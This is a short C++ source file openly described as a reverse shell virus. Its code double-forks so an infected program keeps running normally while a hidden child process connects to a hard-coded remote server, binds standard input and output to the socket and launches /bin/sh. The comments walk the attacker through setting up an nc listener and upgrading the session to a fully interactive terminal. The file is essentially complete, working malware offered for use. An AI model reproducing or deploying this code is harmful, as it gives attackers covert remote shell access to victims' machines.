#include "common/double_fork.hh"
#include "common/macros.hh"
#include "nostdlib/sys/socket.hh"

// A simple reverse shell virus that spawns a process which gives a remote
// server shell access. The infected host will still run as is and terminate but
// the forked child will stay connected to our remote server.
// listen with:
//      nc -k -l 5001
// On client:
// 1: upgrade from shell to bash with:
//      SHELL=/bin/bash script -q /dev/null
// 2: background the current shell with ^z
// 3: update the local terminal line settings with stty2 and bring the remote
//    shell back
//      stty raw -echo && fg
// 4: reset terminal to type linux
//      reset
//      export TERM=xterm-256color
// You should then have a fully interactive shell with command history/auto
// complete + functional vim.
int main() {
  auto work = []() {
    ::sockaddr_in sa{};
    sa.sin_family = AF_INET;
    // Connect to server
    sa.sin_addr.s_addr = vf::inet_addr(192, 168, 50, 60);
    sa.sin_port = htons(5001);

    int s = vf::socket(AF_INET, SOCK_STREAM, 0);

    // retry connecting to server. Give up after 5 seconds to avoid long running
    // process.
    int retry = 0;
    do {
      if (vf::connect(s, (sockaddr*)&sa, sizeof(sa)) < 0) {
        vf::sleep(1);
        retry++;
      } else {
        break;
      }
    } while (retry < 5);

    // redirect stdin, stdout and stderr to socket.
    if (vf::dup2(s, STDIN_FILENO) < 0 || vf::dup2(s, STDOUT_FILENO) < 0 ||
        vf::dup2(s, STDERR_FILENO) < 0) {
      return;
    }
    // start the shell
    vf::execve(STR_LITERAL("/bin/sh"), nullptr, nullptr);
  };

  // Open reverse shell in another process without blocking host.
  vf::common::double_fork(work);

  return 0;
}